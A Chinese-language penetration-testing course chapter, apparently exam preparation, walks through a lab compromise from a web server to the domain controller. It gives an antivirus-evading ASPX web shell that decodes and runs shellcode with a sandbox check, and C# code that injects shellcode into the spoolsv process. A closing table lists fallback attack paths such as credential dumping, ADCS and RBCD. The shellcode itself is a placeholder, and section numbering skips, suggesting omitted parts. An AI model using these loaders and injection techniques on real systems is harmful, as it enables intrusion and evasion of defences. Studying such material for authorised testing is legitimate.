# 综合渗透测试案例 - 从外部到域控

## 概述

本章节通过一个完整的渗透测试案例，展示如何将课程中学到的各种技术串联起来，从外部攻击面一步步渗透到完全控制域环境。

---

## 一、环境概述

### 1.1 目标环境

```
目标网络:
├── DC02 (192.168.120.130) - 域控制器
├── WEB01 (192.168.120.132) - Web服务器
└── FILE01 (192.168.120.131) - 文件服务器

域名: evil.com
```

### 1.2 安全措施

```
安全措施:
├── Windows Defender (所有服务器)
├── AppLocker (应用白名单)
├── LSA Protection (PPL)
├── 本地防火墙
└── 无LAPS
```

### 3.2 绕过杀软的ASPX Web Shell

```aspx
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        // 沙箱检测绕过
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == IntPtr.Zero)
        {
            return;
        }

        // Caesar加密的shellcode (密钥为5)
        // 实际使用时替换为完整加密 byte[]，不要把省略号放进数组。
        byte[] buf = new byte[] { 0x01, 0x4d, 0x88 };

        // 解密shellcode
        for(int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(buf,0,addr,buf.Length);
        IntPtr threadId = IntPtr.Zero;
        IntPtr hThread = CreateThread(IntPtr.Zero,UIntPtr.Zero,addr,IntPtr.Zero,0,ref threadId);
    }
</script>
```

## 八、横向移动到FILE01

### 8.1 进程注入代码

```csharp
// 结合AV绕过和进程注入
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if (mem == IntPtr.Zero) { return; }

// Caesar加密的shellcode
byte[] buf = new byte[] { 0x01, 0x4d, 0x88 };  // 实际使用时替换为完整加密字节

// 解密
for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
}

// 注入到spoolsv进程
Process[] expProc = Process.GetProcessesByName("spoolsv");
int pid = expProc[0].Id;

IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

IntPtr outSize;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## 关键检查点与回退路线

这份案例是线性 walkthrough，复盘时建议补一张“失败时去哪”的表，避免考试中在单点上耗太久。

| 阶段 | 必须记录 | 失败时优先回退 |
|---|---|---|
| 初始枚举 | 端口、Web 功能、上传点、当前入口假设 | 换目录枚举、凭证入口、MSSQL/ADCS/客户端攻击 |
| 初始 Shell | 当前用户、架构、出网、杀软/AMSI 状态 | 先换最小 Payload，再查网络过滤和代理 |
| 提权 | 当前特权、补丁、服务账户、可写目录 | 转凭证、Token、计划任务、服务配置 |
| 凭证获取 | PPL/Credential Guard、Dump 路径、离线结果 | 转 Token、RDP 凭证、机器账户、ADCS |
| 委派/S4U | SPN、机器账户 Hash、票据、目标服务 | 转 RBCD、ACL、MSSQL、ADCS |
| 横向移动 | 端口、认证方式、UAC、服务创建结果 | 换 RDP/WinRM/WMI/Fileless 或先做隧道 |
| 域控目标 | 域管身份、会话来源、最终权限证明 | 回到文件服务器/管理机/JIT/JEA/SQL 继续找高权活动 |

报告可用证据：每一阶段至少保留“入口条件、执行命令、身份变化、影响验证”四类截图或文本输出。
